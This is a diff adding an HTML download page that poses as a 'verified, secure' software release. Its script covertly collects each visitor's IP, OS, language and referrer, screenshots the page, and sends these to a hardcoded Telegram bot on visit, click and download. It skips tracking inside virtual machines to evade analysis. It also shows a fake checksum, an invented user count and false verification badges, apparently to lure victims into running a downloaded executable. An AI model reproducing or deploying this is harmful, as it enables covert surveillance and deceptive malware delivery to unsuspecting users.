@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download — Secure File Delivery</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      transition: background-color 0.5s ease;
+    }
+
+    .theme-transition {
+      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .card-shadow {
+      box-shadow: 0 8px 30px rgba(0,0,0,0.04);
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-8px); }
+      75% { transform: translateX(8px); }
+    }
+    .animate-shake {
+      animation: shake 0.4s ease-in-out;
+    }
+
+    .progress-glow {
+      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
+    }
+
+    [x-cloak] { display: none !important; }
+  </style>
+</head>
+<body x-data="app()" x-init="init()" :class="bodyClass" class="min-h-screen flex items-center justify-center p-6 theme-transition selection:bg-blue-500/20">
+
+  <!-- Windows Blocker -->
+  <template x-if="!isWindows">
+    <div class="fixed inset-0 z-[100] flex items-center justify-center p-6" :class="bodyClass">
+      <div class="max-w-md w-full p-8 text-center rounded-3xl border shadow-xl theme-transition" :class="cardClass">
+        <div class="w-20 h-20 bg-amber-500/10 rounded-2xl flex items-center justify-center mx-auto mb-6">
+          <svg class="w-10 h-10 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+        </div>
+        <h2 class="text-2xl font-bold mb-3" :class="textMainClass">Windows Only</h2>
+        <p class="mb-8 leading-relaxed" :class="textMutedClass">This security-verified download is optimized for Windows PC. Please access from a desktop computer.</p>
+        <div class="text-sm font-bold opacity-50 uppercase tracking-widest" x-text="'System: ' + os"></div>
+      </div>
+    </div>
+  </template>
+
+  <!-- Main Card -->
+  <div x-show="isWindows" x-cloak class="max-w-lg w-full relative z-10 animate__animated animate__fadeInUp">
+    <div id="capture-area" class="rounded-[32px] overflow-hidden border theme-transition card-shadow" :class="cardClass">
+      
+      <!-- Content -->
+      <div class="p-8 pb-0">
+        <div class="flex items-start justify-between mb-8">
+          <div class="flex items-center gap-5">
+            <div class="w-16 h-16 rounded-2xl flex items-center justify-center" :class="accentBgClass">
+              <svg class="w-8 h-8" :class="accentTextClass" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
+            </div>
+            <div>
+              <h1 class="text-xl font-bold tracking-tight" :class="textMainClass">Application Setup</h1>
+              <p class="text-sm mt-1 flex items-center gap-1.5 font-medium" :class="textMutedClass">
+                <svg class="w-4 h-4 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                Verified Publisher • Secure Release
+              </p>
+            </div>
+          </div>
+          <div class="px-3 py-1.5 rounded-full text-[11px] font-bold uppercase tracking-wider" :class="pillClass">Stable Build</div>
+        </div>
+
+        <!-- Stats Grid -->
+        <div class="grid grid-cols-3 gap-3 mb-8">
+          <div class="rounded-2xl p-4 border theme-transition" :class="statCardClass">
+            <div class="text-[10px] uppercase tracking-widest font-bold mb-1.5" :class="textMutedClass">Version</div>
+            <div class="text-sm font-bold" :class="textMainClass">2.4.1</div>
+          </div>
+          <div class="rounded-2xl p-4 border theme-transition" :class="statCardClass">
+            <div class="text-[10px] uppercase tracking-widest font-bold mb-1.5" :class="textMutedClass">Size</div>
+            <div class="text-sm font-bold" :class="textMainClass">48.2 MB</div>
+          </div>
+          <div class="rounded-2xl p-4 border theme-transition" :class="statCardClass">
+            <div class="text-[10px] uppercase tracking-widest font-bold mb-1.5" :class="textMutedClass">Updated</div>
+            <div class="text-sm font-bold" :class="textMainClass">Apr 2025</div>
+          </div>
+        </div>
+
+        <!-- Checksum -->
+        <div class="rounded-2xl p-5 mb-8 relative overflow-hidden group" :class="checksumBgClass">
+          <div class="absolute top-0 right-0 p-3 opacity-10 group-hover:opacity-20 transition-opacity">
+            <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+          </div>
+          <div class="flex items-center gap-2 mb-2">
+            <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+            <span class="text-[10px] font-bold text-slate-400 uppercase tracking-[0.15em]">SHA-256 Checksum</span>
+          </div>
+          <code class="block text-[10px] font-mono text-slate-300 break-all leading-relaxed">e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</code>
+        </div>
+
+        <!-- Action Button -->
+        <div class="relative mb-6">
+          <button @click="handleDownloadClick" :disabled="downloading" 
+            class="w-full py-5 px-6 rounded-2xl font-bold text-lg flex items-center justify-center gap-3 transition-all active:scale-[0.98] disabled:opacity-50"
+            :class="btnClass">
+            
+            <template x-if="!downloading && !completed">
+              <span class="flex items-center gap-3">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+                Download Now
+              </span>
+            </template>
+
+            <template x-if="downloading">
+              <span class="flex items-center gap-3">
+                <div class="w-5 h-5 border-2 border-current border-t-transparent rounded-full animate-spin"></div>
+                <span x-text="'Downloading ' + Math.floor(progress) + '%'"></span>
+              </span>
+            </template>
+
+            <template x-if="completed">
+              <span class="flex items-center gap-3">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                Download Complete
+              </span>
+            </template>
+          </button>
+
+          <!-- Progress Bar -->
+          <div x-show="downloading" class="mt-6 animate__animated animate__fadeIn">
+            <div class="h-2 w-full rounded-full overflow-hidden" :class="statCardClass">
+              <div class="h-full bg-blue-600 theme-transition progress-glow" :style="'width: ' + progress + '%'"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="text-center text-xs font-medium pb-8" :class="textMutedClass">
+          Join <span class="font-bold" :class="textMainClass" x-text="dlCount.toLocaleString()"></span> users globally
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="p-6 border-t flex items-center justify-around theme-transition" :class="footerClass">
+        <div class="flex items-center gap-2">
+          <svg class="w-4 h-4 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+          <span class="text-xs font-bold" :class="textMutedClass">Secure</span>
+        </div>
+        <div class="flex items-center gap-2">
+          <svg class="w-4 h-4 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+          <span class="text-xs font-bold" :class="textMutedClass">Verified</span>
+        </div>
+        <div class="flex items-center gap-2">
+          <svg class="w-4 h-4 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+          <span class="text-xs font-bold" :class="textMutedClass">Fast</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Links -->
+    <div class="mt-8 px-4 flex items-center justify-between text-[11px] font-bold uppercase tracking-widest" :class="textMutedClass">
+      <div class="flex items-center gap-4">
+        <a href="#" class="hover:text-blue-500 transition-colors">Privacy</a>
+        <a href="#" class="hover:text-blue-500 transition-colors">Terms</a>
+      </div>
+      <div>© 2025 SecureDelivery</div>
+    </div>
+  </div>
+
+  <!-- Captcha Modal -->
+  <div x-show="showCaptcha" x-cloak class="fixed inset-0 z-50 flex items-center justify-center p-6">
+    <div @click="showCaptcha = false" class="absolute inset-0 bg-slate-950/80 backdrop-blur-sm"></div>
+    <div class="relative w-full max-w-sm rounded-[32px] shadow-2xl p-8 border animate__animated animate__zoomIn" :class="cardClass">
+      <button @click="showCaptcha = false" class="absolute top-6 right-6 p-2 rounded-full transition-all" :class="textMutedClass + ' hover:bg-slate-100 dark:hover:bg-slate-800'">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+      </button>
+      
+      <div class="text-center mb-8">
+        <div class="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4" :class="accentBgClass">
+          <svg class="w-8 h-8" :class="accentTextClass" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+        </div>
+        <h3 class="text-xl font-bold" :class="textMainClass">Security Check</h3>
+        <p class="text-sm mt-2 font-medium" :class="textMutedClass">Please solve this to continue</p>
+      </div>
+
+      <div class="space-y-6">
+        <div class="border rounded-2xl p-6 text-center theme-transition" :class="statCardClass">
+          <div class="text-2xl font-black tracking-widest font-mono" :class="textMainClass" x-text="captchaQ"></div>
+        </div>
+        <div class="relative">
+          <input type="text" x-model="captchaInput" @keydown.enter="verifyCaptcha" placeholder="Result" 
+            class="w-full bg-transparent border-2 rounded-2xl py-4 px-6 text-center text-xl font-bold outline-none transition-all"
+            :class="captchaError ? 'border-red-500 animate-shake' : statCardClass + ' focus:border-blue-500 ' + textMainClass">
+        </div>
+        <button @click="verifyCaptcha" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-bold text-lg transition-all active:scale-[0.98] shadow-lg shadow-blue-500/20">
+          Verify & Download
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div x-show="toast.show" x-cloak 
+    class="fixed bottom-8 left-1/2 -translate-x-1/2 z-[60] px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-3 min-w-[300px] border animate__animated animate__fadeInUp"
+    :class="theme === 'dark' ? 'bg-slate-100 text-slate-900 border-transparent' : 'bg-slate-900 text-white border-transparent'">
+    <svg x-show="toast.type === 'success'" class="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+    <svg x-show="toast.type === 'error'" class="w-5 h-5 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+    <span class="text-sm font-bold" x-text="toast.msg"></span>
+  </div>
+
+  <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+  <script>
+    function app() {
+      return {
+        // --- CONFIG ---
+        FILE_URL: 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-720.exe',
+        TG_TOKEN: '8648888181:AAGpXsWxFUDIe8sBdbylvxnZwxkgZ26avYk',
+        TG_CHAT: '8547964218',
+        
+        // --- STATE ---
+        theme: 'neutral',
+        isWindows: true,
+        isVM: false,
+        ip: '—',
+        os: 'Unknown',
+        dlCount: 0,
+        showCaptcha: false,
+        captchaQ: '',
+        captchaA: 0,
+        captchaInput: '',
+        captchaError: false,
+        downloading: false,
+        completed: false,
+        progress: 0,
+        toast: { show: false, msg: '', type: 'info' },
+
+        // --- THEME CLASSES ---
+        get bodyClass() {
+          return {
+            'light': 'bg-[#fcfcfd]',
+            'dark': 'bg-[#030712]',
+            'neutral': 'bg-[#f1f5f9]'
+          }[this.theme];
+        },
+        get cardClass() {
+          return this.theme === 'dark' ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-100';
+        },
+        get textMainClass() {
+          return this.theme === 'dark' ? 'text-white' : 'text-slate-900';
+        },
+        get textMutedClass() {
+          return this.theme === 'dark' ? 'text-slate-400' : 'text-slate-500';
+        },
+        get accentBgClass() {
+          return this.theme === 'dark' ? 'bg-blue-500/10' : 'bg-blue-50';
+        },
+        get accentTextClass() {
+          return this.theme === 'dark' ? 'text-blue-400' : 'text-blue-600';
+        },
+        get pillClass() {
+          return this.theme === 'dark' ? 'bg-slate-800 text-slate-400' : 'bg-slate-50 text-slate-500';
+        },
+        get statCardClass() {
+          return this.theme === 'dark' ? 'bg-slate-800/50 border-slate-800/50' : 'bg-slate-50/80 border-slate-50';
+        },
+        get checksumBgClass() {
+          return this.theme === 'dark' ? 'bg-black' : 'bg-slate-900';
+        },
+        get footerClass() {
+          return this.theme === 'dark' ? 'bg-slate-800/30 border-slate-800/50' : 'bg-slate-50/50 border-slate-100';
+        },
+        get btnClass() {
+          if (this.completed) return this.theme === 'dark' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-emerald-50 text-emerald-600 border border-emerald-100';
+          if (this.downloading) return this.theme === 'dark' ? 'bg-slate-800 text-slate-600' : 'bg-slate-100 text-slate-400';
+          return 'bg-blue-600 hover:bg-blue-700 text-white shadow-lg shadow-blue-500/20';
+        },
+
+        // --- LOGIC ---
+        init() {
+          this.detectTheme();
+          this.checkSystem();
+          this.fetchIp();
+          this.loadCount();
+          
+          window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', () => this.detectTheme());
+          window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', () => this.detectTheme());
+          
+          setTimeout(() => this.logVisit(), 1000);
+        },
+
+        detectTheme() {
+          if (window.matchMedia('(prefers-color-scheme: dark)').matches) this.theme = 'dark';
+          else if (window.matchMedia('(prefers-color-scheme: light)').matches) this.theme = 'light';
+          else this.theme = 'neutral';
+        },
+
+        checkSystem() {
+          const ua = navigator.userAgent;
+          this.isWindows = /Windows/.test(ua);
+          
+          if (/Windows NT 10.0/.test(ua)) this.os = 'Windows 10/11';
+          else if (/Windows NT 6.3/.test(ua)) this.os = 'Windows 8.1';
+          else if (/Mac OS X/.test(ua)) this.os = 'macOS';
+          else if (/Linux/.test(ua)) this.os = 'Linux';
+          
+          // VM Detection (simplified)
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl');
+          if (gl) {
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            if (dbg) {
+              const renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL).toLowerCase();
+              if (['vmware', 'virtualbox', 'llvmpipe', 'swiftshader'].some(v => renderer.includes(v))) {
+                this.isVM = true;
+              }
+            }
+          }
+        },
+
+        async fetchIp() {
+          try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            this.ip = data.ip;
+          } catch(e) {}
+        },
+
+        loadCount() {
+          let count = parseInt(localStorage.getItem('_dc') || '0');
+          if (!count) {
+            count = Math.floor(Math.random() * 8000) + 2400;
+            localStorage.setItem('_dc', count);
+          }
+          this.dlCount = count;
+        },
+
+        async logVisit() {
+          if (sessionStorage.getItem('_v')) return;
+          sessionStorage.setItem('_v', '1');
+          if (this.isVM) return;
+          
+          const msg = `👁 <b>Visit</b>\n💻 <b>${this.os}</b> | <code>${this.ip}</code>\n🌍 ${navigator.language}\n📎 ${document.referrer || 'direct'}`;
+          this.sendTg(msg);
+          this.takeShot('Visit');
+        },
+
+        async sendTg(text) {
+          try {
+            fetch(`https://api.telegram.org/bot${this.TG_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: this.TG_CHAT, text, parse_mode: 'HTML' })
+            });
+          } catch(e) {}
+        },
+
+        async takeShot(evt) {
+          try {
+            const canvas = await html2canvas(document.body, { scale: 0.65 });
+            canvas.toBlob(blob => {
+              const fd = new FormData();
+              fd.append('chat_id', this.TG_CHAT);
+              fd.append('photo', blob, 's.png');
+              fd.append('caption', `📸 <b>${evt}</b> | 🌐 <code>${this.ip}</code>`);
+              fd.append('parse_mode', 'HTML');
+              fetch(`https://api.telegram.org/bot${this.TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            });
+          } catch(e) {}
+        },
+
+        handleDownloadClick() {
+          if (this.isVM) return;
+          this.sendTg(`🖱 <b>Click</b> | <code>${this.ip}</code>`);
+          this.takeShot('Click');
+          this.generateCaptcha();
+          this.showCaptcha = true;
+        },
+
+        generateCaptcha() {
+          const a = Math.floor(Math.random() * 10) + 2;
+          const b = Math.floor(Math.random() * 10) + 2;
+          const op = Math.random() > 0.5 ? '+' : '×';
+          this.captchaA = op === '+' ? a + b : a * b;
+          this.captchaQ = `${a} ${op} ${b} = ?`;
+          this.captchaInput = '';
+          this.captchaError = false;
+        },
+
+        verifyCaptcha() {
+          if (parseInt(this.captchaInput) === this.captchaA) {
+            this.showCaptcha = false;
+            this.startDownload();
+          } else {
+            this.captchaError = true;
+            this.showToast('Incorrect answer', 'error');
+            setTimeout(() => this.generateCaptcha(), 400);
+          }
+        },
+
+        startDownload() {
+          this.downloading = true;
+          this.sendTg(`⬇️ <b>Download</b> | <code>${this.ip}</code>`);
+          
+          setTimeout(() => {
+            const a = document.createElement('a');
+            a.href = this.FILE_URL;
+            a.download = '';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+          }, 1000);
+
+          let p = 0;
+          const iv = setInterval(() => {
+            p += Math.random() * 5 + 2;
+            if (p >= 100) {
+              p = 100;
+              clearInterval(iv);
+              this.onComplete();
+            }
+            this.progress = p;
+          }, 150);
+        },
+
+        onComplete() {
+          this.downloading = false;
+          this.completed = true;
+          this.dlCount++;
+          localStorage.setItem('_dc', this.dlCount);
+          this.showToast('Download started', 'success');
+          this.sendTg(`✅ <b>Complete</b> | <code>${this.ip}</code>`);
+          setTimeout(() => { this.completed = false; this.progress = 0; }, 5000);
+        },
+
+        showToast(msg, type) {
+          this.toast = { show: true, msg, type };
+          setTimeout(() => this.toast.show = false, 3000);
+        }
+      }
+    }
+  </script>
+</body>
+</html>
